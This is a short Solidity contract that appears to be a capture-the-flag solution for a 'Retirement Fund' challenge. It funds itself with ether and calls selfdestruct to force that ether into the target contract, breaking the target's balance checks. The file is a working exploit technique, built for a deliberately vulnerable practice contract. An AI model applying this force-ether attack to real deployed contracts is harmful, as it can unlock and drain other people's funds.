// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Math/09-RetirementFundChallenge.sol";

contract RetirementFundForceEther {
    RetirementFundChallenge s_targetContract;

    constructor(address targetContract) payable {
        require(msg.value >= 1 ether, "Not enough ether sent");
        s_targetContract = RetirementFundChallenge(targetContract);
    }

    function forceEther() public {
        //send ether to target contract
        selfdestruct(payable(address(s_targetContract)));
    }
}
